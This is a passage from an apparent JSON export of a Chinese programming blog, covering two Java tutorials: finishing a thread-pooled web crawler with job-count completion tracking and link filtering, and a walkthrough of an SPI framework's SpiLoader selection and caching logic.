executor = new ThreadPoolExecutor(threadConf.getCoreNum(), threadConf.getMaxNum(), threadConf.getAliveTime(), threadConf.getTimeUnit(), new LinkedBlockingQueue&lt;&gt;(threadConf.getQueueSize()), new CustomThreadFactory(threadConf.getThreadName()), new ThreadPoolExecutor.CallerRunsPolicy());} 任务执行，直接将原来的创建Thread方式改成线程池执行方式即可 123// com.quick.hui.crawler.core.fetcher.Fetcher#startexecutor.execute(job); 测试case与之前一样，输出有些区别（主要是线程的名不同）, 可以看到其中 crawl-fetch-1 有两个，因为我们设置的线程的 coreSize = 6 , 而实际的爬取任务有7个，说明有一个被重用了；当爬取任务较多时，这么做的好处就很明显了 1234567crawl-fetch-1 ___ http://chengyu.t086.com/gushi/1.htmcrawl-fetch-2 ___ http://chengyu.t086.com/gushi/2.htmcrawl-fetch-5 ___ http://chengyu.t086.com/gushi/5.htmcrawl-fetch-1 ___ http://chengyu.t086.com/gushi/7.htmcrawl-fetch-3 ___ http://chengyu.t086.com/gushi/3.htmcrawl-fetch-4 ___ http://chengyu.t086.com/gushi/4.htmcrawl-fetch-6 ___ http://chengyu.t086.com/gushi/6.htm 3. ResultFilter 用于结果解析的类，扫描爬取网页中的链接，将满足条件的链接封装之后塞入待爬取队列 这个实现比较简单，比较难处理的是如何判断是否抓取完的逻辑 一个简单的思路如下： 从第0层（seed）出发, 可以知道第一层有count个任务 从第一层的第0个出发，有count10个任务； 第1个出发，有 count11个任务 从第二层的第0个出发，有count20个任务… 当扫描到最后一层时，上一层的完成计数+1，如果此时上一次的完成计数正好等于任务数，则上上一层计数+1，依次知道第0层的计数等于count，此时才表示爬取完成 计数配置 JobCount每个爬取的job，都对应一个 JobCount , 注意其中的几个属性，以及要求保证 JobCount 的 id全局唯一 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465@Getterpublic class JobCount { public static int SEED_ID = 1; public static AtomicInteger idGen = new AtomicInteger(0); public static int genId() { return idGen.addAndGet(1); } /** * 该Job对应的唯一ID */ private int id; /** * 该job对应父job的id */ private int upperId; /** * 当前的层数 */ private int currentDepth; /** * 该job对应的网页中，子Job的数量 */ private AtomicInteger jobCount = new AtomicInteger(0); /** * 该Job对应的网页中， 子Job完成的数量 */ private AtomicInteger finishCount = new AtomicInteger(0); public boolean fetchOver() { return jobCount.get() == finishCount.get(); } /** * 爬取完成一个子任务 */ public synchronized boolean finishJob() { finishCount.addAndGet(1); return fetchOver(); } public JobCount(int id, int upperId, int currentDepth, int jobCount, int finishCount) { this.id = id; this.upperId = upperId; this.currentDepth = currentDepth; this.jobCount.set(jobCount); this.finishCount.set(finishCount); }} 将Job任务与 JobCount关联，因此在 CrwalMeta 中新增两个属性 1234567891011121314/** * 当前任务对应的 {@link JobCount#id } */@Getter@Setterprivate int jobId;/** * 当前任务对应的 {@link JobCount#parentId } */@Getter@Setterprivate int parentJobId; 爬取队列中做出相应的调整，新增一个 isOver 属性，用于确定是否结束；一个 jobCountMap 用于记录每个Job的计数情况 对应的FetchQueue 修改代码如下， 需要注意的是几个finishOneJob方法的实现方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495/** * JobCount 映射表， key为 {@link JobCount#id}, value 为对应的JobCount */public Map&lt;Integer, JobCount&gt; jobCountMap = new ConcurrentHashMap&lt;&gt;();/** * 爬取是否完成的标识 */public volatile boolean isOver = false;/** * 当没有爬取过时， 才丢入队列； 主要是避免重复爬取的问题 * * @param crawlMeta */public boolean addSeed(CrawlMeta crawlMeta) { if (urls.contains(crawlMeta.getUrl())) { return false; } synchronized (this) { if (urls.contains(crawlMeta.getUrl())) { return false; } urls.add(crawlMeta.getUrl()); toFetchQueue.add(crawlMeta); return true; }}public CrawlMeta pollSeed() { return toFetchQueue.poll();}public void finishJob(CrawlMeta crawlMeta, int count, int maxDepth) { if (finishOneJob(crawlMeta, count, maxDepth)) { isOver = true; System.out.println(\"============ finish crawl! ======\"); }}/** * 完成一个爬取任务 * * @param crawlMeta 爬取的任务 * @param count 爬取的网页上满足继续爬取的链接数 * @return 如果所有的都爬取完了， 则返回true */private boolean finishOneJob(CrawlMeta crawlMeta, int count, int maxDepth) { JobCount jobCount = new JobCount(crawlMeta.getJobId(), crawlMeta.getParentJobId(), crawlMeta.getCurrentDepth(), count, 0); jobCountMap.put(crawlMeta.getJobId(), jobCount); if (crawlMeta.getCurrentDepth() == 0) { // 爬取种子页时，特判一下 return count == 0; // 若没有子链接可以爬取， 则直接结束 } if (count == 0 || crawlMeta.getCurrentDepth() == maxDepth) { // 当前的为最后一层的job时， 上一层计数+1 return finishOneJob(jobCountMap.get(crawlMeta.getParentJobId())); } return false;}/** * 递归向上进行任务完成 +1 * * @param jobCount * @return true 表示所有的任务都爬取完成 */private boolean finishOneJob(JobCount jobCount) { if (jobCount.finishJob()) { if (jobCount.getCurrentDepth() == 0) { return true; // 结束 } return finishOneJob(jobCountMap.get(jobCount.getParentId())); } return false;} 所以 Fetch 类中的循环判断条件调整为根据 fetchQueue的 isOver来作为判定条件 12345678910111213141516171819public &lt;T extends DefaultAbstractCrawlJob&gt; void start(Class&lt;T&gt; clz) throws Exception { CrawlMeta crawlMeta; while (!fetchQueue.isOver) { crawlMeta = fetchQueue.pollSeed(); if (crawlMeta == null) { Thread.sleep(200); continue; } DefaultAbstractCrawlJob job = clz.newInstance(); job.setDepth(this.maxDepth); job.setCrawlMeta(crawlMeta); job.setFetchQueue(fetchQueue); executor.execute(job); }} 至此上面实现了结束判定条件的设置，下面则是读 Job中的代码进行分拆，将爬取的网页中链接过滤逻辑，迁移到 ResultFilter中实现，基本上就是代码的迁移 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class ResultFilter { public static void filter(CrawlMeta crawlMeta, CrawlResult crawlResult, FetchQueue fetchQueue, int maxDepth) { int count = 0; try { // 解析返回的网页中的链接，将满足条件的扔到爬取队列中 int currentDepth = crawlMeta.getCurrentDepth(); if (currentDepth &gt;= maxDepth) { return; } // 当前的网址中可以继续爬的链接数 Elements elements = crawlResult.getHtmlDoc().select(\"a[href]\"); String src; for (Element element : elements) { // 确保将相对地址转为绝对地址 src = element.attr(\"abs:href\"); if (!matchRegex(crawlMeta, src)) { continue; } CrawlMeta meta = new CrawlMeta( JobCount.genId(), crawlMeta.getJobId(), currentDepth + 1, src, crawlMeta.getSelectorRules(), crawlMeta.getPositiveRegex(), crawlMeta.getNegativeRegex()); if (fetchQueue.addSeed(meta)) { count++; } } } finally { // 上一层爬完计数+1 fetchQueue.finishJob(crawlMeta, count, maxDepth); } } private static boolean matchRegex(CrawlMeta crawlMeta, String url) { Matcher matcher; for (Pattern pattern : crawlMeta.getPositiveRegex()) { matcher = pattern.matcher(url); if (matcher.find()) { return true; } } for (Pattern pattern : crawlMeta.getNegativeRegex()) { matcher = pattern.matcher(url); if (matcher.find()) { return false; } } return crawlMeta.getPositiveRegex().size() == 0; }} 测试代码与之前加一点变化，将深度设置为2，抓去的正则有小的调整 12345678910111213141516171819202122232425262728293031public class QueueCrawlerTest { public static class QueueCrawlerJob extends DefaultAbstractCrawlJob { public void beforeRun() { // 设置返回的网页编码 super.setResponseCode(\"gbk\"); } @Override protected void visit(CrawlResult crawlResult) { System.out.println(Thread.currentThread().getName() + \"___\" + crawlMeta.getCurrentDepth() + \"___\" + crawlResult.getUrl()); } } @Test public void testCrawel() throws Exception { Fetcher fetcher = new Fetcher(2); String url = \"http://chengyu.t086.com/gushi/1.htm\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.t086.com/gushi/[0-9]+\\\\.html$\"); fetcher.addFeed(crawlMeta); fetcher.start(QueueCrawlerJob.class); }} 输出结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117crawl-fetch-1___0___http://chengyu.t086.com/gushi/1.htmcrawl-fetch-7___1___http://chengyu.t086.com/gushi/673.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/683.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/687.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/672.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/686.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/688.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/684.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/670.htmlmain___1___http://chengyu.t086.com/gushi/669.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/685.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/671.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/679.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/677.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/682.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/681.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/676.htmlmain___1___http://chengyu.t086.com/gushi/660.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/680.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/675.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/678.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/674.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/668.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/667.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/666.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/665.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/662.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/661.htmlmain___1___http://chengyu.t086.com/gushi/651.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/657.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/658.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/663.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/664.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/659.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/656.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/655.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/653.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/652.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/654.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/650.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/648.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/649.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/647.htmlmain___1___http://chengyu.t086.com/gushi/640.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/644.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/645.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/643.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/646.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/641.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/642.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/639.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/635.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/637.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/634.htmlmain___1___http://chengyu.t086.com/gushi/629.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/638.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/633.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/632.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/636.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/630.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/631.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/627.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/628.htmlmain___1___http://chengyu.t086.com/gushi/617.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/625.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/622.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/624.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/626.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/623.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/621.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/620.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/614.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/618.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/612.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/611.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/619.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/616.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/615.htmlmain___1___http://chengyu.t086.com/gushi/605.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/613.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/610.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/609.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/608.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/606.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/607.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/603.htmlmain___1___http://chengyu.t086.com/gushi/594.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/604.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/600.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/602.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/599.htmlcrawl-fetch-3___1___http://chengyu.t086.com/gushi/601.htmlcrawl-fetch-5___1___http://chengyu.t086.com/gushi/598.htmlcrawl-fetch-6___1___http://chengyu.t086.com/gushi/596.htmlcrawl-fetch-1___1___http://chengyu.t086.com/gushi/597.htmlcrawl-fetch-4___1___http://chengyu.t086.com/gushi/593.htmlcrawl-fetch-8___1___http://chengyu.t086.com/gushi/591.htmlcrawl-fetch-9___1___http://chengyu.t086.com/gushi/595.htmlcrawl-fetch-7___1___http://chengyu.t086.com/gushi/592.htmlmain___2___http://chengyu.t086.com/gushi/583.htmlcrawl-fetch-3___2___http://chengyu.t086.com/gushi/588.htmlcrawl-fetch-10___1___http://chengyu.t086.com/gushi/590.htmlcrawl-fetch-2___1___http://chengyu.t086.com/gushi/589.htmlcrawl-fetch-5___2___http://chengyu.t086.com/gushi/579.htmlcrawl-fetch-1___2___http://chengyu.t086.com/gushi/581.htmlcrawl-fetch-7___2___http://chengyu.t086.com/gushi/584.htmlcrawl-fetch-4___2___http://chengyu.t086.com/gushi/582.htmlcrawl-fetch-3___2___http://chengyu.t086.com/gushi/587.htmlcrawl-fetch-6___2___http://chengyu.t086.com/gushi/580.htmlcrawl-fetch-9___2___http://chengyu.t086.com/gushi/585.htmlcrawl-fetch-8___2___http://chengyu.t086.com/gushi/586.htmlcrawl-fetch-10___2___http://chengyu.t086.com/gushi/578.htmlcrawl-fetch-1___2___http://chengyu.t086.com/gushi/575.htmlcrawl-fetch-2___2___http://chengyu.t086.com/gushi/577.htmlcrawl-fetch-5___2___http://chengyu.t086.com/gushi/576.htmlcrawl-fetch-7___2___http://chengyu.t086.com/gushi/574.html============ finish crawl! ====== 小结 本片主要集中在一个爬取队列+线程池方式，来实现并发的爬取任务，同时实现了一个比较猥琐的结束爬取的方案 缺陷上面的实现，有一个非常明显的缺陷，就是相应的日志输出太少，下一篇博文将着手于此，将一些关键链路的日志信息打印出来；同时将剩下的几个待优化点一并做掉 到这里，基本上一个爬虫框架的雏形算是基本完成（当然还有很多问题，如队列的深度，JobCountMap可能爆掉，还有一些爬虫的基本注意事项等都有缺陷，但没关系，留待后续一点一点来完善） 源码地址项目地址： https://github.com/liuyueyi/quick-crawler 优化前对应的tag: v0.004 优化后对应的tag: v0.005 相关博文Quick-Crawel爬虫系列博文 II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/07/07/Java-动手写爬虫-三、爬取队列/"},{"title":"3. SPI框架实现之旅三：实现说明","text":"实现说明 前一篇 《SPI框架实现之旅二：整体设计》中，介绍了几个定义的接口，注解；叙述了实现流程；并简单的介绍了 SpiLoader中的部分实现； 本篇则主要介绍SpiLoader类的实现 类图结构如下： SpiLoader 全解析 spiImpl选择的核心类，包括初始化选择器，初始化spiImpl实现列表，解析spiImpl的选择条件，返回具体的实现类等 1. 获取spiLoader对象 SpiLoader 是一个泛型对象，每个SPI接口，对应一个SpiLoader&lt;T&gt; 对象，我们提供了一个静态方法来获取这个对象 实现优先从缓存中获取， 如果缓存没有，则新建一个；缓存中有， 则直接返回 123456789101112131415161718192021222324252627282930/*** spiLoader缓存, 其中key为 spi接口, value为对应的Loader对象*/private static final ConcurrentMap&lt;Class&lt;?&gt;, SpiLoader&lt;?&gt;&gt; loaderCache = new ConcurrentHashMap&lt;&gt;();@SuppressWarnings(\"unchecked\")public static &lt;T&gt; SpiLoader&lt;T&gt; load(Class&lt;T&gt; type) { if (null == type) { throw new IllegalArgumentException(\"common cannot be null...\"); } if (!type.isInterface()) { throw new IllegalArgumentException(\"common class:\" + type + \" must be interface!\"); } if (!withSpiAnnotation(type)) { throw new IllegalArgumentException(\"common class:\" + type + \" must have the annotation of @Spi\"); } SpiLoader&lt;T&gt; spiLoader = (SpiLoader&lt;T&gt;) loaderCache.get(type); if (spiLoader == null) { loaderCache.putIfAbsent(type, new SpiLoader&lt;&gt;(type)); spiLoader = (SpiLoader&lt;T&gt;) loaderCache.get(type); } return spiLoader;} 说明 上面有几个校验，前一篇已经说明，不再赘述 上面新建对象，不是线程安全的 2. 新建 SpiLoader对象 创建对象，主要会初始化选择器 实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263private SpiLoader(Class&lt;T&gt; type) { // 初始化默认的选择器, 为保留项目, 必然会提供的服务 selectorInstanceCacheMap.putIfAbsent(DefaultSelector.class, DEFAULT_SELECTOR); this.spiInterfaceType = type; initSelector();}private void initSelector() { Spi ano = spiInterfaceType.getAnnotation(Spi.class); if (ano == null) { currentSelector = initSelector(DefaultSelector.class); } else { currentSelector = initSelector(ano.selector()); } Method[] methods = this.spiInterfaceType.getMethods(); currentMethodSelector = new ConcurrentHashMap&lt;&gt;(); SelectorWrapper temp; for (Method method : methods) { if (!method.isAnnotationPresent(SpiAdaptive.class)) { continue; } temp = initSelector(method.getAnnotation(SpiAdaptive.class).selector()); if (temp == null) { continue; } currentMethodSelector.put(method.getName(), temp); }}private SelectorWrapper initSelector(Class&lt;? extends ISelector&gt; clz) { // 优先从选择器缓存中获取类型对应的选择器 if (selectorInstanceCacheMap.containsKey(clz)) { return selectorInstanceCacheMap.get(clz); } try { ISelector selector = clz.newInstance(); Class paramClz = null; Type[] types = clz.getGenericInterfaces(); for (Type t : types) { if (t instanceof ParameterizedType) { paramClz = (Class) ((ParameterizedType) t).getActualTypeArguments()[0]; break; } } Assert.check(paramClz != null); SelectorWrapper wrapper = new SelectorWrapper(selector, paramClz); selectorInstanceCacheMap.putIfAbsent(clz, wrapper); return wrapper; } catch (Exception e) { throw new IllegalArgumentException(\"illegal selector defined! yous:\" + clz); }} 说明 持有一个选择器缓存列表，selectorInstanceCacheMap 保证每种类型的选择器，在这个SpiLoader中，只会有一个实例存在 不做成全局唯一的原因是尽量隔离, 比如 ParamsSelector 内部缓存了spi实现的列表，如果全局公用的话，就会混掉，导致这个列表中就出现非这个spi接口的实现类 类选择器 + 方法选择器 currentSelector ： 类选择器, 解析 @Spi 注解获取，适用于静态选择 + 动态选择两种使用方式 currentMethodSelector : 方法选择器，解析 @SpiAdaptive 注解获取， 仅适用于动态选择SPI实现的方式 优先级： 方法上定义的选择器 由于 类上定义的选择器； 方法上未定义时，默认使用类定义的选择器 3. 静态使用 静态使用方式，表示根据传入的条件，选择一个满足条件的实现返回 实现1234567891011121314151617181920212223242526272829303132333435/*** 根据传入条件, 选择具体的spi实现类* &lt;p/&gt;* 这里要求conf的类型和选择器的参数类型匹配, 否则会尝试使用默认的选择器补救, 若补救失败, 则抛异常** @param conf* @return* @throws NoSpiMatchException* @throws IllegalArgumentException*/@SuppressWarnings(\"unchecked\")public T getService(Object conf) throws NoSpiMatchException { if (spiImplClassCacheMap == null || spiImplClassCacheMap.size() == 0) { loadSpiService(); } if (!currentSelector.getConditionType().isAssignableFrom(conf.getClass())) { /** * 参数类型不匹配时, 判断是否可以根据默认的选择器来获取 */ if (conf instanceof String) { return (T) DEFAULT_SELECTOR.getSelector().selector(spiImplClassCacheMap, conf); } /** * 参数类型完全不匹配, 则抛参数异常 */ throw new IllegalArgumentException(\"conf spiInterfaceType should be sub class of [\" + currentSelector.getConditionType() + \"] but yours:\" + conf.getClass()); } return (T) currentSelector.getSelector().selector(spiImplClassCacheMap, conf);} 说明 spiImplClassCacheMap spi实现的缓存映射表，优先判断缓存映射表是否存在，不存在时需要初始化；存在时，则进入校验逻辑 校验 校验传入的参数，是否匹配当前的选择器参数类型，为了保证选择器可以正常运行 当不匹配时，会有一个兼容逻辑，判断传参类型是否为String， 是则采用默认的选择器，根据name来选择spi实现 （这种实现可能造成选择的实现不是预期的） 静态使用方式，使用类定义选择器 : currentSelector 静态使用的方式，目标就是事前就确认使用这个实现了，不会出现变动了； 相当于一次确认，所有的调用都是确认的 静态使用，方法注解的选择器无效。这个我们从逆向的思路进行解释 IPrint 是一个Spi接口， 有两个实现 FilePrint, ConsolePrint 假设 `currentSelector=DefaultSelector`， 方法 methodA 上定义的是 ParamsSelector 时 静态使用方式，获取一个spi实现，希望在所有的spi接口使用处，都输出到文件，用户根据 `FilePrint` 选择 FilePrint 这个类来执行具体的输出逻辑， 如果在调用 methodA 方法执行时， 假设根据 ParamsSelector 判断， ConsolePrint 才满足这儿条件，这是相当于在具体实现时，换成了另一个 ConsolePrint, 这下子就与我们的初衷背离了（如果目标是想实现这个场景，显然动态适配的方式才是正确的使用姿势） loadService 的逻辑后面详细说明 4. 动态使用 动态使用区别于静态的直接确定实现类， 通过getService 获取的并不是某个特定对的实现类，而是一个动态生成的代理，每次具体执行之前，会去判断一下，应该选择哪一个实现来执行 设计的出发点可以考虑下，我们的目标是在执行方法之前，需要判断一下哪个实现类满足要求，选择这个实现类来执行这个方法，那么我们可以怎么去做？ 考虑到切面的方式，如果有一种手段，在方法执行之前，织入一段业务逻辑，就可以达到上面的目的 最开始虽然是怎么想的，但是有点尴尬的是，不知道怎么去实现；因此换了一个思路，我自己新生成一个接口的实现类，在这个实现类里面做选择逻辑，然后把这个实现类对象返回 实现如下和静态实现的逻辑差不多，一般流程如下: 判断spi实现类的映射关系表是否初始化，若没有则初始化 获取选择器 优先从方法选择器中查找， 若存在，则直接选中； 不存在，则使用类选择器 校验：判断传入条件参数类型是否满足选择器的参数类型匹配（将方法的第一个参数，作为选择器的选择条件） 返回实现类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@SuppressWarnings(\"unchecked\")public T getService(Object conf, String methodName) throws NoSpiMatchException { if (spiImplClassCacheMap == null || spiImplClassCacheMap.size() == 0) { loadSpiService(); } // 首先获取对应的selector SelectorWrapper selector = currentMethodSelector.get(methodName); if (selector == null) { // 自适应方法上未定义选择器, 则默认继承类的 selector = currentSelector; currentMethodSelector.putIfAbsent(methodName, selector); } if (!selector.getConditionType().isAssignableFrom(conf.getClass())) { // 选择器类型校验 if (!(conf instanceof String)) { throw new IllegalArgumentException(\"conf spiInterfaceType should be sub class of [\" + currentSelector.getConditionType() + \"] but yours:\" + conf.getClass()); } selector = DEFAULT_SELECTOR; } if (spiImplMethodCacheMap.size() == 0) { return (T) selector.getSelector().selector(spiImplClassCacheMap, conf); } try { // 采用默认的选择器,根据指定name 进行查询时, 需要兼容一下, 因为method对应的缓存key为 SpiImpName_methodName if (DEFAULT_SELECTOR.equals(selector)) { if (spiImplMethodCacheMap.containsKey(conf)) { return (T) selector.getSelector().selector(spiImplMethodCacheMap, conf); } if (spiImplClassCacheMap.containsKey(conf)) { return (T) selector.getSelector().selector(spiImplClassCacheMap, conf); } return (T) selector.getSelector().selector(spiImplMethodCacheMap, conf + \"_\" + methodName); } else { return (T) selector.getSelector().selector(spiImplMethodCacheMap, conf); } } catch (Exception e) { return (T) selector.getSelector().selector(spiImplClassCacheMap, conf); }} 说明 这个方法通常是由框架生成的代理实现类来调用（后面会说明动态生成代理类的逻辑） 区别与静态使用方式， 优先根据方法名，查找对应的选择器；当未定义时，使用类选择器 默认选择器，根据name来查询实现时，传入的参数特殊处理下，主要是因为 spiImplMethodCacheMap 中key的生成，有一个小转换 若实现类上没有 @SpiConf注解，或者 @SpiConf的注解没有定义 name 属性，则类的唯一标识name为：简单类名； 否则为指定的name属性 若方法上显示使用 @SpiConf 指定了name属性，则key的生成规则为： 方法注解上指定的name； 如果没有 @SpiConf注解，或其中没有指定name属性，则key生成规则: 类name属性 + 下划线 + 方法名 这一点单独看可能不太好理解，因此可以和下面的spi实现类映射关系的初始化结合起来 动态生成代理类的逻辑，放在最后进行说明 5. spi实现类映射关系表初始化 为了避免每次选择具体的实现类时，都去加载一遍，耗时耗力好性能，因此加一个缓存是很有必要的，这里主要说下这个实现逻辑，以及为啥这么干 缓存结构使用了两个Map： 一个是类级别的映射关系 spiImplClassCacheMap 静态使用时，只会用搞这个 动态适配时，当下面的映射关系中无法获取满足条件的实现时，会再次从这里进行判断 key： @SpiConf 注解中定义的name； 或者spi实现类的简单类名 一个是方法的映射关系 spiImplMethodCacheMap 动态适配时， 选择器优先从这里进行判断 key: @SpiConf 注解中定义的name； 或者是 实现类的 name + “_” + 方法名 12345678910/*** name : spiImpl 的映射表*/private Map&lt;String, SpiImplWrapper&lt;T&gt;&gt; spiImplClassCacheMap;/*** 自适应时, 根据方法选择实现; name : spiImpl 的映射表*/private Map&lt;String, SpiImplWrapper&lt;T&gt;&gt; spiImplMethodCacheMap; 实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101private void loadSpiService() { List&lt;SpiImplWrapper&lt;T&gt;&gt; spiServiceList = new ArrayList&lt;&gt;(); List&lt;SpiImplWrapper&lt;T&gt;&gt; spiServiceMethodList = new ArrayList&lt;&gt;(); ServiceLoader&lt;T&gt; serviceLoader = ServiceLoader.load(spiInterfaceType); SpiConf spiConf; String implName; int implOrder; for (T t : serviceLoader) { spiConf = t.getClass().getAnnotation(SpiConf.class); Map&lt;String, String&gt; map; if (spiConf == null) { implName = t.getClass().getSimpleName(); implOrder = SpiImplWrapper.DEFAULT_ORDER; // 参数选择器时, 要求spi实现类必须有 @SpiConf 注解, 否则选择器无法获取校验条件参数 if (currentSelector.getSelector() instanceof ParamsSelector) { throw new IllegalStateException(\"spiImpl must contain annotation @SpiConf!\"); } map = Collections.emptyMap(); } else { implName = spiConf.name(); if (StringUtils.isBlank(implName)) { implName = t.getClass().getSimpleName(); } implOrder = spiConf.order() &lt; 0 ? SpiImplWrapper.DEFAULT_ORDER : spiConf.order(); map = parseParms(spiConf.params()); } // 添加一个类级别的封装类 spiServiceList.add(new SpiImplWrapper&lt;&gt;(t, implOrder, implName, map)); // todo 改成 getMethods(), 但是过滤掉 Object类中的基础方法 Method[] methods = t.getClass().getDeclaredMethods(); String methodImplName; int methodImplOrder; Map&lt;String, String&gt; methodParams; for (Method method : methods) { spiConf = method.getAnnotation(SpiConf.class); if (spiConf == null) { continue; } // 方法上有自定义注解, 且定义的name与类实现名不同, 则直接采用 // 否则采用 ServiceName_MethodName 方式定义 if (StringUtils.isBlank(spiConf.name()) || implName.equals(spiConf.name())) { methodImplName = implName + \"_\" + method.getName(); } else { methodImplName = spiConf.name(); } // 优先级, 以最小的为准 （即一个类上的优先级很低, 也可以定义优先级高的方法） // 方法注解未定义顺序时, 继承类上的顺序 methodImplOrder = Math.min(implOrder, spiConf.order() &lt; 0 ? implOrder : spiConf.order()); // 自适应方法的参数限制, 要求继承类上的参数 methodParams = parseParms(spiConf.params()); if (map.size() &gt; 0) { // 方法的参数限定会继承类上的参数限定 if (methodParams.size() == 0) { methodParams = map; } else { methodParams.putAll(map); } } spiServiceMethodList.add(new SpiImplWrapper&lt;&gt;(t, methodImplOrder, methodImplName, methodParams)); } } if (spiServiceList.size() == 0) { throw new IllegalStateException(\"no spiImpl implements spi: \" + spiInterfaceType); } this.spiImplClassCacheMap = initSpiImplMap(spiServiceList); this.spiImplMethodCacheMap = initSpiImplMap(spiServiceMethodList);}private Map&lt;String, SpiImplWrapper&lt;T&gt;&gt; initSpiImplMap(List&lt;SpiImplWrapper&lt;T&gt;&gt; list) { // 映射为map, 限定不能重名 Map&lt;String, SpiImplWrapper&lt;T&gt;&gt; tempMap = new ConcurrentHashMap&lt;&gt;(); for (SpiImplWrapper&lt;T&gt; wrapper : list) { if (tempMap.containsKey(wrapper.getName())) { throw new IllegalArgumentException(\"duplicate spiImpl name \" + wrapper.getName()); } tempMap.put(wrapper.getName(), wrapper); } return tempMap;} 